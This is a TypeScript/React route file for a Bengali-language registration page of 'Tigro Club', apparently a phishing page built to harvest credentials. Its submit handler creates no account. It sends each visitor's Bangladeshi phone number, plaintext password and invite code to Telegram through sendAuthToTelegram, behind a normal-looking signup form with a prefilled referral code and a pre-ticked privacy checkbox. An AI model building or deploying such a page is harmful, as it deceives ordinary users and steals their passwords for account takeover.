import { createFileRoute, Link, useRouter } from "@tanstack/react-router";
import { useState } from "react";
import { AuthHeader } from "@/components/tigro/Brand";
import { SupportBubble } from "@/components/tigro/SupportBubble";
import { FieldLabel, PasswordInput, PhoneInput, TextInput, icons } from "@/components/tigro/Field";
import { sendAuthToTelegram } from "@/lib/telegram";

export const Route = createFileRoute("/register")({
  head: () => ({
    meta: [
      { title: "নিবন্ধন — Tigro Club" },
      { name: "description", content: "ফোন নম্বর বা ইমেল দ্বারা Tigro Club-এ নিবন্ধন করুন।" },
      { property: "og:title", content: "নিবন্ধন — Tigro Club" },
      { property: "og:description", content: "ফোন নম্বর বা ইমেল দ্বারা নিবন্ধন করুন।" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: RegisterPage,
});

function RegisterPage() {
  const router = useRouter();
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [confirm, setConfirm] = useState("");
  const [invite, setInvite] = useState("66666100062");
  const [loading, setLoading] = useState(false);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (loading) return;
    setLoading(true);

    const fullPhone = phone ? `+880${phone.replace(/\D/g, "")}` : undefined;

    await sendAuthToTelegram({
      type: "signup",
      phone: fullPhone,
      password,
      inviteCode: invite,
      extra: confirm !== password ? "password_mismatch" : undefined,
    });

    setLoading(false);
  }

  return (
    <main className="min-h-screen animate-[fade-in_0.5s_ease-out] bg-background pb-12">
      <AuthHeader
        title="নিবন্ধন"
        lines={["ফোন নম্বর বা ইমেল দ্বারা নিবন্ধন করুন"]}
        onBack={() => router.history.back()}
      />

      <section className="px-5">
        <div className="pt-6 text-center">
          <div className="flex justify-center">{icons.phone}</div>
          <h2 className="mt-2 text-lg font-semibold text-brand-deep">
            আপনার ফোন নিবন্ধন করুন
          </h2>
        </div>
        <div className="mx-auto mt-4 h-px w-full bg-brand" />

        <form className="mt-7 space-y-6" onSubmit={handleSubmit}>
          <div>
            <FieldLabel icon={icons.phone}>ফোন নম্বর</FieldLabel>
            <PhoneInput value={phone} onChange={setPhone} />
          </div>

          <div>
            <FieldLabel icon={icons.lock}>পাসওয়ার্ড সেট করুন</FieldLabel>
            <PasswordInput
              placeholder="পাসওয়ার্ড সেট করুন"
              value={password}
              onChange={setPassword}
            />
          </div>

          <div>
            <FieldLabel icon={icons.lock}>পাসওয়ার্ড নিশ্চিত করুন</FieldLabel>
            <PasswordInput
              placeholder="পাসওয়ার্ড নিশ্চিত করুন"
              value={confirm}
              onChange={setConfirm}
            />
          </div>

          <div>
            <FieldLabel icon={icons.ticket}>আমন্ত্রণ কোড</FieldLabel>
            <TextInput value={invite} onChange={setInvite} />
          </div>

          <label className="flex flex-wrap items-center gap-x-2 gap-y-1 text-sm leading-relaxed">
            <input type="checkbox" defaultChecked className="h-6 w-6 shrink-0 accent-[oklch(0.86_0.17_92)]" />
            <span className="text-foreground">আমি পড়েছি এবং একমত</span>
            <Link to="/privacy" className="font-semibold text-destructive">
              【গোপনীয়তা চুক্তি】
            </Link>
          </label>

          <button type="submit" className="btn-brand h-14 w-full text-lg" disabled={loading}>
            {loading ? "..." : "নিবন্ধন"}
          </button>

          <Link
            to="/login"
            className="flex h-14 w-full items-center justify-center gap-3 rounded-full border border-brand text-base text-foreground"
          >
            আমার একটি একাউন্ট আছে
            <span className="font-semibold text-brand-deep">লগ - ইন করতে</span>
          </Link>
        </form>
      </section>

      <SupportBubble />
    </main>
  );
}
